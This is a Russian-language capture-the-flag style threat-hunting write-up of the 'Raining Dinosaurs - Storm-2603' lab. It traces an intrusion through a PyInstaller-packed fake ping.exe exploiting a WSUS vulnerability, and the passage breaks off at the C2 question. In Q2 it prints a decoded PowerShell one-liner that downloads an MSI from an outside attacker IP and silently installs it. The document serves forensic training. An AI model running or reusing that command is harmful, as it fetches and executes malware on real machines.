# Raining Dinosaurs - Storm-2603 Lab

### Категория: Threat Hunting

### Инструменты: Detect It Easy (DiE), pyinstxtractor-ng, pylingual, CyberChef, Splunk, логи Suricata.

## Сценарий

17 ноября 2025 года в сети зафиксировали подозрительную активность: сначала аномальный трафик с сервера в DMZ, потом движение внутри сети и в конце — массовое шифрование файлов. Моя задача была восстановить полную цепочку атаки: от первого взлома до финального ущерба. В распоряжении были подозрительный exe-файл и логи в Splunk.

---

## Initial Access

### Q1. Эта уязвимость позволила злоумышленнику получить первоначальный доступ и позже переместиться на DC01. Какой CVE ID связан с этим эксплойтом?

**Ответ:** `CVE-2025-59287`

1. Открыла подозрительный файл `ping.exe` в Detect It Easy. DiE сразу показал, что это не системная утилита, а упакованный PyInstaller python скрипт. 
2. Вытащила содержимое через `pyinstxtractor-ng.exe` и получилась папка с .pyc файлами. Среди них был файл `cve-2025-59287.pyc`. 
3. Декомпилировала его через `pylingual`, посмотрела код и нашла подтверждение: внутри была логика эксплуатации именно этой уязвимости WSUS.

<img width="500" height="250" alt="1 вопрос" src="https://github.com/user-attachments/assets/5616e3a1-dab5-4860-b97b-c1c10e1a39f2" />

### Q2. Разверните предоставленный двоичный код и проанализируйте его. Как называется переменная, содержащая полезная нагрузка?
**Ответ:** `popcalc`

1. После декомпиляции я начала читать полученный python код и искала полезнаую нагрузку. 
2. Нашла переменную `popcalc`, в которой лежала Base64 строка. 
3. Декодировала её и внутри оказалась команда PowerShell, которая скачивает и запускает `v2.msi` с сервера злоумышленника.
`(New-Object Net.WebClient).DownloadFile('http://3.70.251.99:7000/v2.msi', 'C:\Users\Public\v2.msi'); Start-Process msiexec -ArgumentList '/i C:\Users\Public\v2.msi /qn /norestart' -Waitz`

<img width="1000" height="400" alt="2 вопрос" src="https://github.com/user-attachments/assets/da659323-c085-4b49-ae1f-c3bd9d4fed03" />  <img width="1000" height="400" alt="2-2вопросPopcalc" src="https://github.com/user-attachments/assets/07ba0917-0896-4088-8047-285a29ae2e4f" />


### Q3. После получения первоначального доступа на WSUS-SERVER-01, в контексте какой учетной записи выполнялись команды злоумышленника?

**Ответ:** `NT AUTHORITY\SYSTEM`

(На WSUS-SERVER-01 в событиях создания процессов  видно, что все команды шли от имени NT AUTHORITY\SYSTEM + в одном из файлов встретила строку `<string>Administrator=SYSTEM</string>`. 

---

## Command and Control 

### Q4. Злоумышленнику удалось установить инструмент, функционирующий как C2-маяк. Название какого инструмента они адаптировали для C2?
